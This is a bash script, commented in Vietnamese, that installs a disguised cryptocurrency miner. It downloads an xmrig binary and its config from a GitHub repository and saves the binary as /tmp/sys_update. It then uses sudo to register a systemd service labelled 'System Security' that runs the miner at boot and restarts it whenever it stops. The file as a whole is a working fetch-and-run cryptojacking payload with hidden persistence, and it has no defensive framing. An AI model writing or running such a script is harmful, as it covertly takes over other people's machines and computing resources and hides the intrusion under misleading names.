#!/bin/bash

# 1. Chuyển vùng làm việc
cd /tmp || exit

# 2. Tải config và ép kiểu xóa sạch dấu cách thừa/xuống dòng lạ
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' > /tmp/config.json

# 3. Tải file thực thi
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
chmod +x /tmp/sys_update

# 4. TẠO STARTUP (Dùng printf để né lỗi xuống dòng của file sh)
sudo printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n" | sudo tee /etc/systemd/system/sys_update.service > /dev/null

# 5. KÍCH HOẠT VÀ CHẠY
sudo systemctl daemon-reload
sudo systemctl enable sys_update
sudo systemctl restart sys_update
